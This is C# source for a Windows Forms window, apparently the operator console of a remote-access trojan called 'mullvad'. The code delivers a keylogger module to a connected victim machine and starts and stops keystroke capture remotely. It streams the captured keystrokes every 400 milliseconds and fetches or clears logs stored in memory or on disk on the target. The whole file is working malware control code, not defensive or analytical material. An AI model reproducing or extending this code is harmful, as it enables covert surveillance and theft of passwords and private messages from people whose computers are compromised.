using mullvad.Modules;
using mullvad.Network;
using mullvad.Theme;
using System.Text.Json;

namespace mullvad.Forms
{
    public sealed class KeyloggerForm : Form
    {
        private const string ModuleFile = "mullvad.Module.Keylogger";
        private const string ModuleId   = "mullvad.keylogger";

        private readonly ClientHandler _handler;
        private ModuleContext?         _ctx;

        private readonly TabControl     _tabs;
        private readonly TabPage        _tabOnline;
        private readonly TabPage        _tabOffline;

        // Online tab
        private readonly RichTextBox    _onlineBox;
        private readonly Button         _btnStartStop;
        private readonly Button         _btnOnlineClear;
        private readonly Label          _lblOnlineStatus;
        private          bool           _online        = false;
        private          string         _lastLog       = "";
        private readonly System.Windows.Forms.Timer _pollTimer;

        // Offline tab
        private readonly RichTextBox    _offlineBox;
        private readonly ComboBox       _modeCombo;
        private readonly Button         _btnRefresh;
        private readonly Button         _btnOfflineClear;
        private readonly Label          _lblOfflineStatus;

        private readonly StatusStrip          _status;
        private readonly ToolStripStatusLabel _statusLabel;

        private static readonly Dictionary<ClientHandler, KeyloggerForm> _openForms = new();

        public static KeyloggerForm CreateOrActivate(ClientHandler handler)
        {
            if (_openForms.TryGetValue(handler, out var existing) && !existing.IsDisposed)
            {
                existing.BringToFront();
                return existing;
            }
            var frm = new KeyloggerForm(handler);
            frm.FormClosed += (_, _) => _openForms.Remove(handler);
            _openForms[handler] = frm;
            return frm;
        }

        private KeyloggerForm(ClientHandler handler)
        {
            _handler = handler;

            Text          = $"Keylogger — {handler.Info.Computer}";
            Size          = new Size(600, 500);
            MinimumSize   = new Size(440, 360);
            Font          = new Font("Segoe UI", 9F);
            StartPosition = FormStartPosition.CenterScreen;

            var ico = IconLoader.Load("keyboard_add.png") as Bitmap
                   ?? IconLoader.Load("monitoring.png") as Bitmap;
            if (ico is not null) try { Icon = Icon.FromHandle(ico.GetHicon()); } catch { }

            // ── Online tab ────────────────────────────────────────────────────
            _tabOnline  = new TabPage("Online");
            _onlineBox  = new RichTextBox
            {
                Dock      = DockStyle.Fill,
                ReadOnly  = true,
                Font      = new Font("Consolas", 9F),
                BackColor = Color.Black,
                ForeColor = Color.Lime,
                ScrollBars = RichTextBoxScrollBars.Vertical,
                WordWrap  = true,
            };

            _btnStartStop   = new Button { Text = "Start", Width = 80, Height = 26, FlatStyle = FlatStyle.Flat };
            _btnOnlineClear = new Button { Text = "Clear",  Width = 60, Height = 26, FlatStyle = FlatStyle.Flat };
            _lblOnlineStatus = new Label { AutoSize = true, ForeColor = Color.Gray };
            _btnStartStop.Click   += (_, _) => _ = ToggleOnlineAsync();
            _btnOnlineClear.Click += (_, _) => { _onlineBox.Clear(); _lastLog = ""; };

            var onlineBar = new FlowLayoutPanel
            {
                Dock         = DockStyle.Bottom,
                Height       = 34,
                Padding      = new Padding(4, 4, 4, 4),
                WrapContents = false,
            };
            onlineBar.Controls.Add(_btnStartStop);
            onlineBar.Controls.Add(_btnOnlineClear);
            onlineBar.Controls.Add(_lblOnlineStatus);

            _tabOnline.Controls.Add(_onlineBox);
            _tabOnline.Controls.Add(onlineBar);

            // ── Offline tab ───────────────────────────────────────────────────
            _tabOffline  = new TabPage("Offline");
            _offlineBox  = new RichTextBox
            {
                Dock       = DockStyle.Fill,
                ReadOnly   = true,
                Font       = new Font("Consolas", 9F),
                BackColor  = Color.Black,
                ForeColor  = Color.Lime,
                ScrollBars = RichTextBoxScrollBars.Vertical,
                WordWrap   = true,
            };

            _modeCombo = new ComboBox
            {
                DropDownStyle = ComboBoxStyle.DropDownList,
                Width         = 110,
                Height        = 26,
            };
            _modeCombo.Items.AddRange(new object[] { "In memory", "On disk" });
            _modeCombo.SelectedIndex = 0;

            _btnRefresh      = new Button { Text = "Refresh", Width = 70, Height = 26, FlatStyle = FlatStyle.Flat };
            _btnOfflineClear = new Button { Text = "Clear",   Width = 60, Height = 26, FlatStyle = FlatStyle.Flat };
            _lblOfflineStatus = new Label { AutoSize = true, ForeColor = Color.Gray };
            _btnRefresh.Click      += (_, _) => _ = RefreshOfflineAsync();
            _btnOfflineClear.Click += (_, _) => _ = ClearOfflineAsync();

            var offlineBar = new FlowLayoutPanel
            {
                Dock         = DockStyle.Bottom,
                Height       = 34,
                Padding      = new Padding(4, 4, 4, 4),
                WrapContents = false,
            };
            offlineBar.Controls.Add(_modeCombo);
            offlineBar.Controls.Add(_btnRefresh);
            offlineBar.Controls.Add(_btnOfflineClear);
            offlineBar.Controls.Add(_lblOfflineStatus);

            _tabOffline.Controls.Add(_offlineBox);
            _tabOffline.Controls.Add(offlineBar);

            // ── Tab control ───────────────────────────────────────────────────
            _tabs = new TabControl { Dock = DockStyle.Fill };
            _tabs.TabPages.Add(_tabOnline);
            _tabs.TabPages.Add(_tabOffline);

            // ── Status strip ──────────────────────────────────────────────────
            _status      = new StatusStrip();
            _statusLabel = new ToolStripStatusLabel("Initialising…") { Spring = true, TextAlign = ContentAlignment.MiddleLeft };
            _status.Items.Add(_statusLabel);

            // ── Poll timer (for Online streaming) ────────────────────────────
            _pollTimer          = new System.Windows.Forms.Timer { Interval = 400 };
            _pollTimer.Tick    += (_, _) => _ = PollOnlineAsync();

            Controls.Add(_tabs);
            Controls.Add(_status);
        }

        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);
            _ = InitAsync();
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            _pollTimer.Stop();
            _pollTimer.Dispose();
            if (_online) _ = StopOnlineAsync();
            _ctx?.Dispose();
            base.OnFormClosed(e);
        }

        // ── Init ──────────────────────────────────────────────────────────────

        private async Task InitAsync()
        {
            SetStatus("Delivering module…");
            try
            {
                var bytes = ModuleLoader.GetModuleBytes(ModuleFile);
                if (bytes is null) { SetStatus("Module not found — build the Keylogger project first."); return; }

                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(60));
                bool ok = await ModuleDelivery.EnsureDeliveredAsync(_handler, ModuleFile, bytes, null, cts.Token);
                if (!ok) { SetStatus("Module delivery failed."); return; }

                _ctx = new ModuleContext(_handler, ModuleId);
                _ctx.Disconnected += (_, _) => BeginInvoke(() =>
                {
                    _pollTimer.Stop();
                    _online = false;
                    SetStatus("Client disconnected.");
                    _btnStartStop.Text    = "Start";
                    _btnStartStop.Enabled = false;
                    _btnRefresh.Enabled   = false;
                });

                SetStatus("Ready.");
                _btnStartStop.Enabled = true;
                _btnRefresh.Enabled   = true;
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() => SetStatus($"Error: {ex.Message}"));
            }
        }

        // ── Online mode ───────────────────────────────────────────────────────

        private async Task ToggleOnlineAsync()
        {
            if (_ctx is null) return;
            if (!_online)
            {
                _btnStartStop.Enabled = false;
                SetStatus("Starting keylogger…");
                try
                {
                    using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));
                    string json = await _ctx.ExecuteAsync("start", "{}", cts.Token);
                    if (IsDisposed) return;
                    BeginInvoke(() =>
                    {
                        if (ParseBool(json, "active") || ParseBool(json, "ok"))
                        {
                            _online        = true;
                            _lastLog       = "";
                            _btnStartStop.Text    = "Stop";
                            _btnStartStop.Enabled = true;
                            _pollTimer.Start();
                            SetStatus("Keylogger active — streaming…");
                        }
                        else
                        {
                            _btnStartStop.Enabled = true;
                            SetStatus("Start failed: " + json);
                        }
                    });
                }
                catch (Exception ex)
                {
                    if (!IsDisposed) BeginInvoke(() => { _btnStartStop.Enabled = true; SetStatus($"Error: {ex.Message}"); });
                }
            }
            else
            {
                await StopOnlineAsync();
            }
        }

        private async Task StopOnlineAsync()
        {
            _pollTimer.Stop();
            _btnStartStop.Enabled = false;
            SetStatus("Stopping…");
            try
            {
                if (_ctx is not null)
                {
                    using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(10));
                    string json = await _ctx.ExecuteAsync("stop", "", cts.Token);
                    if (!IsDisposed) BeginInvoke(() => AppendOnlineLog(json));
                }
            }
            catch { }
            if (!IsDisposed) BeginInvoke(() =>
            {
                _online = false;
                _btnStartStop.Text    = "Start";
                _btnStartStop.Enabled = _ctx is not null;
                SetStatus("Stopped.");
            });
        }

        private async Task PollOnlineAsync()
        {
            if (_ctx is null || !_online) return;
            try
            {
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
                string json = await _ctx.ExecuteAsync("fetch", "", cts.Token);
                if (!IsDisposed) BeginInvoke(() => AppendOnlineLog(json));
            }
            catch { }
        }

        private void AppendOnlineLog(string json)
        {
            string log = ParseStr(json, "log");
            if (log.Length > _lastLog.Length && log.StartsWith(_lastLog, StringComparison.Ordinal))
            {
                string delta = log[_lastLog.Length..];
                _onlineBox.AppendText(delta);
                _onlineBox.ScrollToCaret();
                _lastLog = log;
            }
            else if (log.Length > 0 && log != _lastLog)
            {
                _onlineBox.Text = log;
                _onlineBox.SelectionStart = _onlineBox.Text.Length;
                _onlineBox.ScrollToCaret();
                _lastLog = log;
            }
        }

        // ── Offline mode ──────────────────────────────────────────────────────

        private async Task RefreshOfflineAsync()
        {
            if (_ctx is null) return;
            _btnRefresh.Enabled = false;
            SetStatus("Fetching keylog…");

            string payload = _modeCombo.SelectedIndex == 1 ? "{\"mode\":\"disk\"}" : "{}";

            try
            {
                // Start if not active (offline mode — start with selected storage mode)
                using var cts1 = new CancellationTokenSource(TimeSpan.FromSeconds(8));
                string statusJson = await _ctx.ExecuteAsync("status", "", cts1.Token);
                bool active = ParseBool(statusJson, "active");

                if (!active)
                {
                    using var cts2 = new CancellationTokenSource(TimeSpan.FromSeconds(8));
                    await _ctx.ExecuteAsync("start", payload, cts2.Token);
                }

                using var cts3 = new CancellationTokenSource(TimeSpan.FromSeconds(8));
                string json = await _ctx.ExecuteAsync("fetch", "", cts3.Token);

                if (IsDisposed) return;
                BeginInvoke(() =>
                {
                    string log = ParseStr(json, "log");
                    _offlineBox.Text = log;
                    _offlineBox.SelectionStart = _offlineBox.Text.Length;
                    _offlineBox.ScrollToCaret();
                    int chars = log.Length;
                    SetStatus($"Refreshed — {chars} char(s)  —  {DateTime.Now:HH:mm:ss}");
                    _btnRefresh.Enabled = true;
                });
            }
            catch (Exception ex)
            {
                if (!IsDisposed) BeginInvoke(() =>
                {
                    SetStatus($"Error: {ex.Message}");
                    _btnRefresh.Enabled = true;
                });
            }
        }

        private async Task ClearOfflineAsync()
        {
            if (_ctx is null) return;
            try
            {
                using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(5));
                await _ctx.ExecuteAsync("clear", "", cts.Token);
                if (!IsDisposed) BeginInvoke(() => { _offlineBox.Clear(); SetStatus("Cleared."); });
            }
            catch { }
        }

        // ── Helpers ───────────────────────────────────────────────────────────

        private static bool ParseBool(string json, string key)
        {
            try
            {
                using var doc = JsonDocument.Parse(json);
                return doc.RootElement.TryGetProperty(key, out var v) && v.GetBoolean();
            }
            catch { return false; }
        }

        private static string ParseStr(string json, string key)
        {
            try
            {
                using var doc = JsonDocument.Parse(json);
                if (doc.RootElement.TryGetProperty(key, out var v))
                    return v.GetString() ?? "";
            }
            catch { }
            return "";
        }

        private void SetStatus(string text)
        {
            if (InvokeRequired) { BeginInvoke(() => SetStatus(text)); return; }
            _statusLabel.Text = text;
        }
    }
}
